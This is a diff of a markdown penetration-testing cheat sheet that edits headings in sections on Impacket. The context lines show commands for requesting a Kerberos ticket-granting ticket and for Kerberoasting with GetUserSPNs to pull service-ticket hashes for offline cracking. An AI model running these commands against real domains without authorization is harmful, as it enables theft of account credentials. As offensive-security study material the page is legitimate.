@@ -24,9 +24,9 @@
 
 ## Impacket
 
-### GetTGT
+### Generate Kerberos TGT w/ <mark style="color:yellow;">Impacket-GetTGT</mark>
 
-Generate Kerberos TGT:
+Generate TGT:
 
 ```
 impacket-getTGT domain/user:password
@@ -51,7 +51,7 @@ MM/DD/YYYY TIME       MM/DD/YYYY TIME    krbtgt/domain@domain
         renew until MM/DD/YYYY TIME
 ```
 
-### Kerberoast
+### Kerberoasting w/ Impacket-<mark style="color:yellow;">GetUserSPNs</mark>
 
 ```
 impacket-GetUserSPNs domain/user:password -dc-ip hostname_or_ip_of_dc -k
@@ -95,3 +95,5 @@ Requesting hash:
 ```
 impacket-GetUserSPNs domain/user:password -dc-host hostname_or_ip_of_dc -k -no-pass -request
 ```
+
+### Cracking&#x20;
